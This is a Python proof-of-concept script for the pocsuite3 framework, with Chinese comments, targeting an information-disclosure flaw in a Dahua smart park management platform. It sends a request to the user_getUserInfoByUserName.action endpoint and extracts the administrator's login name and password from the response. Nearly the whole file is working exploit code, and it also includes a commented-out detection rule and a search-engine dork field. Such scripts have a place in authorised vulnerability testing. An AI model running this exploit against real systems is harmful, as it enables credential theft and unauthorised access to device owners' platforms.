#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from poc_tool.tools import tools
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    POC_CATEGORY, )

minimum_version_required('2.0.4')


class DemoPOC(POCBase):
    vulID = '0'  # Seebug 漏洞收录 ID，如果没有则为 0
    version = '1'  # PoC 的版本，默认为 1
    author = 'zhizhuo'  # PoC 的作者
    vulDate = '2023-08-14'  # 漏洞公开日期 (%Y-%m-%d)
    createDate = '2023-10-16'  # PoC 编写日期 (%Y-%m-%d)
    updateDate = '2023-10-16'  # PoC 更新日期 (%Y-%m-%d)
    # 漏洞来源地址，0day 不用写
    references = [
        'https://peiqi.wgpsec.org/wiki/iot/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E%20%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20user_getUserInfoByUserName.action%20%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html']
    # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
    name = '大华 智慧园区综合管理平台 信息泄漏'
    appPowerLink = 'https://www.dahuatech.com/'  # 漏洞厂商主页地址
    appName = '智慧园区综合管理平台'  # 漏洞应用名称
    appVersion = ''  # 漏洞影响版本
    vulType = 'Information Disclosure'  # 漏洞类型，参见漏洞类型规范表
    desc = '大华 智慧园区综合管理平台 /user_getUserInfoByUserName.action中存在API接口，导致管理园账号密码泄漏'  # 漏洞简要描述
    samples = ['http://192.168.1.1']  # 测试样列，就是用 PoC 测试成功的目标
    pocDesc = ''' poc的用法描述 '''
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # PoC 的分类
    protocol = POC_CATEGORY.PROTOCOL.HTTP  # PoC 的默认协议，方便对 url 格式化
    protocol_default_port = 8443  # 目标的默认端口，当提供的目标不包含端口的时候，方便对 url 格式化
    # 搜索 dork，如果运行 PoC 时不提供目标且该字段不为空，将会调用插件从搜索引擎获取目标。
    # dork = {'zoomeye': 'deviceState.admin.hostname'}
    # suricata_request = '''http.uri; content: "/user_getUserInfoByUserName.action";'''  # 请求流量 suricata 规则
    # suricata_response = ''  # 响应流量 suricata 规则
    hasexp = False  # 是否有EXP
    Level = 2  # 漏洞危害等级，0低危 1中危害 2高危 3严重
    device_name = 'dahua-智慧园区综合管理平台'

    def _exploit(self, param=''):
        if not self._check(dork=''):
            return False
        headers = {}
        payload = param
        res = requests.get(self.url + '/admin/user_getUserInfoByUserName.action', headers=headers, params=payload)
        logger.debug(res.text)
        return res

    def _verify(self):
        result = {}
        req_list = list()
        param = 'userName=system'
        res = self._exploit(param)
        req_list.append(tools.get_all_requests(res))
        if res.status_code == 200 and 'loginName' in res.text and 'loginPass' in res.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['DATA'] = res.json().get('loginName') + ":" + res.json().get('loginPass')
            result["request"] = req_list
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
